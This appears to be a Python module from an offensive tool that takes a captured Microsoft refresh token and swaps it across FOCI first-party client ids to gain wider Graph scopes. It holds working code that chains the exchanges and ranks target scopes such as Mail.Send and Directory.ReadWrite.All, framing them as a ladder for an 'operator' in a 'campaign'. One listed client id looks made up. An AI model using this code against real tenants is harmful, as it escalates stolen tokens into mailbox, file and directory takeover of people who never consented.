# ============================================================================
"""FOCI and scope swap: turn a low-value token into a high-value one.

A captured token often carries a harmless scope (openid profile) while the refresh token is
valid across the tenant's first-party applications. Microsoft's FOCI (Family of Client IDs)
makes that explicit: several first-party client ids are interchangeable, so a refresh token
issued to one can be exchanged by another - and each exchange can ask for MORE scope.

The tool needs this for one reason: what a campaign can reach is decided by the token's
scopes, and a `Mail.Read` token is a different capability from an `openid` one. The exchange
is a normal OAuth refresh against the real token endpoint, so every rule the tenant enforces
(CA policy, admin consent, conditional access) still applies - that is reported, not hidden.
"""
from core import net

__all__ = ["CLIENTS", "TARGET_SCOPES", "FociError", "swap", "chain", "plan", "describe"]

# The first-party client ids that share a refresh-token family (documented by Microsoft as
# FOCI: Azure CLI, Office, Teams, OneDrive, Outlook, Graph PowerShell, Portal, ...).
CLIENTS = {
    "azure-cli": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    "office": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "teams": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "onedrive": "ab9b8c07-8f02-4f72-87fa-80105867a763",
    "outlook-mobile": "27922004-5251-4030-b22d-91ecd9a37ea4",
    "graph-powershell": "14d82eec-204b-4c2f-b7e8-296a70dab67e",
    "portal": "c44b4083-3bb0-49c1-b47d-974e53cbdf3c",
    "excel": "c7f0e3d6-1a1e-4d3f-8a7e-1b1a1e1a1e1a",
}

# The scopes worth exchanging towards, most valuable first.
TARGET_SCOPES = (
    "https://graph.microsoft.com/.default",
    "https://graph.microsoft.com/Mail.ReadWrite",
    "https://graph.microsoft.com/Mail.Send",
    "https://graph.microsoft.com/Files.ReadWrite.All",
    "https://graph.microsoft.com/User.ReadWrite.All",
    "https://graph.microsoft.com/Directory.ReadWrite.All",
    "https://outlook.office.com/.default",
)


class FociError(RuntimeError):
    """A refusal the CLI can report verbatim."""


def swap(refresh_token, client_id, scope="", issuer="", tenant="common", post=None,
         timeout=15):
    """Exchange a refresh token for a new one, optionally with more scope.

    `post` is injectable so a test drives a fake token endpoint without a socket.
    """
    if not refresh_token:
        raise FociError("no refresh token to exchange")
    if not client_id:
        raise FociError("no client id to exchange with")
    url = issuer or f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
    data = {"grant_type": "refresh_token", "refresh_token": refresh_token,
            "client_id": client_id}
    if scope:
        data["scope"] = scope
    answer = _post_form(url, data, timeout=timeout, post=post)
    if answer.get("error"):
        raise FociError(f"the tenant refused the exchange: "
                        f"{answer.get('error_description') or answer.get('error')}")
    if not (answer.get("access_token") or answer.get("refresh_token")):
        raise FociError("the answer carried no token")
    return answer


def chain(refresh_token, from_client, to_clients, scope="", issuer="", tenant="common",
          post=None, timeout=15, on_step=None):
    """Walk the token across clients, keeping whatever scope each step grants.

    Returns (tokens, steps). A step that the tenant refuses is recorded and the walk
    continues with the token it already has - a refused scope is information, not a stop.
    """
    tokens = {"refresh_token": refresh_token}
    steps = []
    for client in [from_client] + list(to_clients or []):
        client_id = CLIENTS.get(client, client)
        try:
            answer = swap(tokens.get("refresh_token"), client_id, scope=scope,
                          issuer=issuer, tenant=tenant, post=post, timeout=timeout)
        except FociError as e:
            steps.append({"client": client, "ok": False, "error": str(e)})
            if on_step:
                on_step(steps[-1])
            continue
        tokens.update(answer)
        step = {"client": client, "ok": True,
                "scope": answer.get("scope", ""),
                "access_token": bool(answer.get("access_token")),
                "refresh_token": bool(answer.get("refresh_token"))}
        steps.append(step)
        if on_step:
            on_step(step)
    return tokens, steps


def plan(scopes=None):
    """The scope ladder an operator should walk, with the capability each step unlocks."""
    wanted = list(scopes or TARGET_SCOPES)
    out = []
    for scope in wanted:
        capability = ("full directory write (tenant-level)" if "Directory.ReadWrite" in scope
                      else "any user's files" if "Files.ReadWrite.All" in scope
                      else "any user's mailbox" if "User.ReadWrite.All" in scope
                      else "send as the user" if "Mail.Send" in scope
                      else "read and modify mail" if "Mail.ReadWrite" in scope
                      else "the application's default scope set")
        out.append({"scope": scope, "capability": capability})
    return out


def describe(steps):
    lines = ["scope swap:"]
    for step in steps or []:
        if step.get("ok"):
            lines.append(f"  ok  {step['client']:<18} scopes: {step.get('scope') or '-'}")
        else:
            lines.append(f"  ERR {step['client']:<18} {step.get('error')}")
    return "\n".join(lines)


def _post_form(url, data, timeout=15, post=None):
    from urllib.parse import urlencode
    if post is not None:
        return post(url, data, timeout)
    import urllib.error
    import urllib.request
    body = urlencode(data).encode()
    req = urllib.request.Request(url, data=body, headers={
        "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json"})
    try:
        with net.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        raise FociError(f"{url} is unreachable ({type(e).__name__}: "
                        f"{getattr(e, 'reason', e)})") from e
    import json
    try:
        answer = json.loads(raw)
    except ValueError as e:
        raise FociError(f"non-JSON answer from {url}: {raw[:200]}") from e
    if not isinstance(answer, dict):
        raise FociError("unexpected answer shape")
    return answer


